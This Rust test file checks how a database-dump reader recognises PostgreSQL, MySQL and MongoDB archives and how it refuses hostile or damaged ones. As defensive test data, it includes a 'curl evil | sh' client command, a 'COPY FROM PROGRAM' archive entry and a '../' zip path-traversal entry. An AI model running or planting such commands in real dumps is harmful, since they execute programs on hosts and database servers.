//! Format detection and the archive readers, on the real dumps in tests/fixtures/dumps (see make.sh there).

use super::*;

fn path(name: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../tests/fixtures/dumps")
        .join(name)
}

async fn pick_fixture(name: &str) -> Dump {
    pick(&path(name), "t".into())
        .await
        .unwrap_or_else(|e| panic!("{name}: {}", e.message))
}

fn has(d: &Dump, kind: &str, name: &str) -> bool {
    d.info
        .objects
        .iter()
        .any(|o| o.kind == kind && o.name == name)
}

#[tokio::test]
async fn every_fixture_is_recognised_from_its_bytes() {
    let cases: &[(&str, DumpFormat, Option<&str>)] = &[
        ("pg13.custom", DumpFormat::PgCustom, None),
        ("pg16.custom", DumpFormat::PgCustom, None),
        ("pg16.custom.gz", DumpFormat::PgCustom, Some("gzip")),
        ("pg17.custom", DumpFormat::PgCustom, None),
        ("pg13.tar", DumpFormat::PgTar, None),
        ("pg17.tar", DumpFormat::PgTar, None),
        ("pg16.dir", DumpFormat::PgDirectory, None),
        ("pg16.dir.tar", DumpFormat::PgDirectory, None),
        ("pg13.sql", DumpFormat::PgPlain, None),
        ("pg13.sql.bz2", DumpFormat::PgPlain, Some("bzip2")),
        ("pg16.sql.gz", DumpFormat::PgPlain, Some("gzip")),
        ("pg17.sql.zst", DumpFormat::PgPlain, Some("zstd")),
        ("pg16-all.sql", DumpFormat::PgPlain, None),
        ("mysql84.sql", DumpFormat::MySql, None),
        ("mysql84.sql.gz", DumpFormat::MySql, Some("gzip")),
        ("mariadb11.sql.xz", DumpFormat::MySql, Some("xz")),
        ("mongo7.archive", DumpFormat::MongoArchive, None),
        ("mongo7.archive.gz", DumpFormat::MongoArchive, Some("gzip")),
        ("mongo7.dir", DumpFormat::MongoFolder, None),
    ];
    for (name, format, compression) in cases {
        let d = pick_fixture(name).await;
        assert_eq!(d.info.format, *format, "{name}");
        assert_eq!(d.info.compression.as_deref(), *compression, "{name}");
        assert!(d.info.refused.is_none(), "{name}: {:?}", d.info.refused);
        assert!(!d.info.guessed, "{name}");
        assert_eq!(d.info.needs_upload, format.is_folder(), "{name}");
    }
}

#[tokio::test]
async fn pg_archives_list_their_contents_from_the_table_of_contents() {
    for (name, ver) in [
        ("pg13.custom", (1, 14)),
        ("pg16.custom", (1, 15)),
        ("pg17.custom", (1, 16)),
        ("pg13.tar", (1, 14)),
        ("pg17.tar", (1, 16)),
        ("pg16.dir", (1, 15)),
        ("pg16.dir.tar", (1, 15)),
    ] {
        let d = pick_fixture(name).await;
        assert_eq!(d.archive_version, Some(ver), "{name}");
        for (k, n) in [
            ("table", "public.customers"),
            ("table", "public.orders"),
            ("view", "public.big_orders"),
            ("function", "public.order_count(integer)"),
            ("type", "public.mood"),
            ("trigger", "orders orders_touch"),
        ] {
            assert!(
                has(&d, k, n),
                "{name}: {k} {n} in {:?}",
                d.info
                    .objects
                    .iter()
                    .map(|o| format!("{} {}", o.kind, o.name))
                    .collect::<Vec<_>>()
            );
        }
        assert_eq!(d.info.source_db.as_deref(), Some("shop"), "{name}");
        assert!(
            d.info
                .made_by
                .as_deref()
                .unwrap_or("")
                .starts_with("pg_dump 1"),
            "{name}"
        );
        assert!(
            d.info
                .notes
                .iter()
                .any(|n| n.code == "owners" && n.text.contains("app_owner")),
            "{name}: {:?}",
            d.info.notes
        );
        assert_eq!(d.info.encoding.as_deref(), Some("UTF8"), "{name}");
        // Rows are read from the table data inside the archive (gzip in custom and directory dumps, plain in tar).
        let rows = |t: &str| {
            d.info
                .objects
                .iter()
                .find(|o| o.kind == "table" && o.name == t)
                .and_then(|o| o.rows)
        };
        assert_eq!(
            (rows("public.orders"), rows("public.customers")),
            (Some(4.0), Some(3.0)),
            "{name}"
        );
        assert!(
            d.toc
                .iter()
                .any(|e| e.desc == "TABLE DATA" && !e.deps.is_empty()),
            "{name}"
        );
        assert!(
            d.tables.contains(&("public".into(), "orders".into())),
            "{name}"
        );
    }
    assert_eq!(pick_fixture("pg13.custom").await.dump_major, Some(13));
    assert_eq!(pick_fixture("pg17.tar").await.dump_major, Some(17));
}

#[tokio::test]
async fn plain_and_mysql_dumps_are_read_through_their_compression() {
    let d = pick_fixture("pg17.sql.zst").await;
    assert!(has(&d, "table", "public.orders"));
    assert_eq!(
        d.info
            .objects
            .iter()
            .find(|o| o.name == "public.orders")
            .and_then(|o| o.rows),
        Some(4.0)
    );
    assert_eq!(d.dump_major, Some(17));
    let d = pick_fixture("mariadb11.sql.xz").await;
    assert!(d.info.mariadb);
    assert!(d.info.notes.iter().any(|n| n.code == "sandbox"));
    assert!(d.info.notes.iter().any(|n| n.code == "definer"));
    let d = pick_fixture("pg16-all.sql").await;
    assert!(d.info.databases.contains(&"shop".into()));
    assert!(d.info.notes.iter().any(|n| n.code == "superuser"));
}

#[tokio::test]
async fn mongo_archives_and_folders_count_their_documents() {
    for name in ["mongo7.archive", "mongo7.archive.gz", "mongo7.dir"] {
        let d = pick_fixture(name).await;
        let get = |n: &str| {
            d.info
                .objects
                .iter()
                .find(|o| o.name == n)
                .unwrap_or_else(|| panic!("{name}: {n} in {:?}", d.info.objects))
        };
        assert_eq!(get("customers").rows, Some(3.0), "{name}");
        assert_eq!(get("orders").rows, Some(2.0), "{name}");
        assert_eq!(get("big_orders").kind, "view", "{name}");
        assert_eq!(d.info.databases, vec!["shop".to_string()], "{name}");
        assert!(
            d.info
                .made_by
                .as_deref()
                .unwrap_or("")
                .starts_with("mongodump"),
            "{name}"
        );
    }
    // A folder is handed to mongorestore from its top, above the database folder.
    let d = pick_fixture("mongo7.dir").await;
    assert_eq!(d.folder.as_deref(), Some(path("mongo7.dir").as_path()));
}

#[tokio::test]
async fn unknown_hostile_and_damaged_files_say_so() {
    let dir = TempDir::new("test").unwrap();
    let write = |n: &str, b: &[u8]| {
        let p = dir.0.join(n);
        std::fs::write(&p, b).unwrap();
        p
    };
    let e = pick(&write("x.png", b"\x89PNG\r\n\x1a\nrest"), "t".into())
        .await
        .err()
        .unwrap();
    assert_eq!(e.code, ErrorCode::DbDumpUnknown);
    assert!(e.message.contains("\\x89PNG"), "{}", e.message);
    // A hostile plain dump is read and shown, with the reason it won't be restored.
    let d = pick(
        &write(
            "evil.sql",
            b"-- PostgreSQL database dump\nCREATE TABLE t (a int);\n\\! curl evil | sh\n",
        ),
        "t".into(),
    )
    .await
    .unwrap();
    assert_eq!(d.info.refused.as_deref(), Some("Line 3 has a client command (`\\!`), which runs a program on the host. Dalan won't restore this file."));
    assert!(has(&d, "table", "t"));
    // A damaged archive.
    let mut cut = std::fs::read(path("pg16.custom")).unwrap();
    cut.truncate(200);
    assert_eq!(
        pick(&write("cut.dump", &cut), "t".into())
            .await
            .err()
            .unwrap()
            .code,
        ErrorCode::DbDumpUnknown
    );
    let mut cut = std::fs::read(path("mongo7.archive")).unwrap();
    cut.truncate(100);
    assert_eq!(
        pick(&write("cut.archive", &cut), "t".into())
            .await
            .err()
            .unwrap()
            .code,
        ErrorCode::DbDumpUnknown
    );
    // A generic SQL file is a guess, and says so.
    let d = pick(
        &write(
            "g.sql",
            b"CREATE TABLE `t` (a int) ENGINE=InnoDB;\nINSERT INTO `t` VALUES (1),(2);\n",
        ),
        "t".into(),
    )
    .await
    .unwrap();
    assert!(d.info.guessed && d.info.format == DumpFormat::MySql);
    // A zip with one file is unwrapped; a zip with a folder is unpacked.
    let one = {
        let p = dir.0.join("one.zip");
        let mut z = zip::ZipWriter::new(std::fs::File::create(&p).unwrap());
        z.start_file("pg16.sql", zip::write::SimpleFileOptions::default())
            .unwrap();
        std::io::Write::write_all(&mut z, &std::fs::read(path("pg16.sql")).unwrap()).unwrap();
        z.finish().unwrap();
        p
    };
    let d = pick(&one, "t".into()).await.unwrap();
    assert_eq!(
        (d.info.format, d.info.compression.as_deref()),
        (DumpFormat::PgPlain, Some("zip"))
    );
    let folder = {
        let p = dir.0.join("dir.zip");
        let mut z = zip::ZipWriter::new(std::fs::File::create(&p).unwrap());
        for f in std::fs::read_dir(path("pg16.dir")).unwrap().flatten() {
            z.start_file(
                format!("pg16/{}", f.file_name().to_string_lossy()),
                zip::write::SimpleFileOptions::default(),
            )
            .unwrap();
            std::io::Write::write_all(&mut z, &std::fs::read(f.path()).unwrap()).unwrap();
        }
        z.start_file("../escape.txt", zip::write::SimpleFileOptions::default())
            .unwrap();
        z.finish().unwrap();
        p
    };
    let d = pick(&folder, "t".into()).await.unwrap();
    assert_eq!(d.info.format, DumpFormat::PgDirectory);
    let unpacked = d.folder.clone().unwrap();
    assert!(unpacked.join("toc.dat").is_file());
    assert!(!dir.0.join("escape.txt").exists());
    let top = d._unpacked.as_ref().unwrap().0.clone();
    drop(d);
    assert!(
        !top.exists(),
        "the unpacked folder is removed with the dump"
    );
}

#[tokio::test]
async fn a_hostile_archive_entry_is_refused() {
    // Build a one-entry custom archive by hand whose definition reads a server file.
    fn int(v: &mut Vec<u8>, x: i64) {
        v.push(u8::from(x < 0));
        v.extend_from_slice(&(x.unsigned_abs() as u32).to_le_bytes());
    }
    fn s(v: &mut Vec<u8>, x: Option<&str>) {
        match x {
            None => int(v, -1),
            Some(t) => {
                int(v, t.len() as i64);
                v.extend_from_slice(t.as_bytes());
            }
        }
    }
    let mut a = b"PGDMP".to_vec();
    a.extend_from_slice(&[1, 15, 0, 4, 8, 1, 0]);
    for x in [0, 0, 0, 1, 0, 125, 0] {
        int(&mut a, x);
    }
    for x in ["shop", "16.0", "16.0"] {
        s(&mut a, Some(x));
    }
    int(&mut a, 1);
    int(&mut a, 7);
    int(&mut a, 0);
    s(&mut a, Some("0"));
    s(&mut a, Some("0"));
    s(&mut a, Some("evil"));
    s(&mut a, Some("TABLE"));
    int(&mut a, 2);
    s(&mut a, Some("COPY public.t FROM PROGRAM 'id';"));
    s(&mut a, Some(""));
    s(&mut a, Some(""));
    s(&mut a, Some("public"));
    s(&mut a, Some(""));
    s(&mut a, Some(""));
    s(&mut a, Some("postgres"));
    s(&mut a, Some("false"));
    s(&mut a, None);
    a.push(1);
    a.extend_from_slice(&[0u8; 8]);
    let dir = TempDir::new("test").unwrap();
    let p = dir.0.join("evil.dump");
    std::fs::write(&p, &a).unwrap();
    let d = pick(&p, "t".into()).await.unwrap();
    assert!(
        d.info
            .refused
            .as_deref()
            .unwrap_or("")
            .contains("runs a program on the database server"),
        "{:?}",
        d.info.refused
    );
}

#[tokio::test]
async fn truncated_archives_never_panic() {
    for name in ["pg17.custom", "pg13.tar", "mongo7.archive"] {
        let full = std::fs::read(path(name)).unwrap();
        let dir = TempDir::new("test").unwrap();
        for cut in (0..full.len()).step_by(37) {
            let p = dir.0.join("c");
            std::fs::write(&p, &full[..cut]).unwrap();
            let _ = pick(&p, "t".into()).await;
        }
    }
}

#[test]
fn pg_restore_list_output_is_read_for_newer_archives() {
    let text = ";\n; Archive created at 2026-11-20\n;\n3436; 0 16390 TABLE DATA public orders app\n224; 1259 16385 TABLE public orders app\n230; 2606 16400 CONSTRAINT public orders orders_pkey app\n215; 1255 16380 FUNCTION public order_count(integer) app\n3; 2615 2200 SCHEMA - public pg_database_owner\n";
    let e = parse_list(text);
    assert_eq!(e.len(), 5);
    assert_eq!(
        (
            e[0].id,
            e[0].desc.as_str(),
            e[0].namespace.as_str(),
            e[0].tag.as_str(),
            e[0].owner.as_str()
        ),
        (3436, "TABLE DATA", "public", "orders", "app")
    );
    assert_eq!(e[2].tag, "orders orders_pkey");
    assert_eq!(e[3].tag, "order_count(integer)");
    assert_eq!((e[4].namespace.as_str(), e[4].tag.as_str()), ("", "public"));
}

#[test]
fn choosing_tables_in_an_archive_leaves_out_their_data_keys_and_dependants() {
    let rt = tokio::runtime::Runtime::new().unwrap();
    let d = rt.block_on(pick(&path("pg16.custom"), "t".into())).unwrap();
    let keep = crate::sql::restore::toc_list(&d.toc, &["public.customers".to_string()]);
    let kept: Vec<String> = d
        .toc
        .iter()
        .filter(|e| keep.contains(&e.id))
        .map(|e| format!("{} {}", e.desc, e.tag))
        .collect();
    assert!(
        kept.contains(&"TABLE customers".to_string())
            && kept.contains(&"TABLE DATA customers".to_string()),
        "{kept:?}"
    );
    assert!(!kept.iter().any(|k| k.contains("orders")), "{kept:?}");
    assert!(
        kept.contains(&"TYPE mood".to_string()),
        "objects of no table stay: {kept:?}"
    );
}
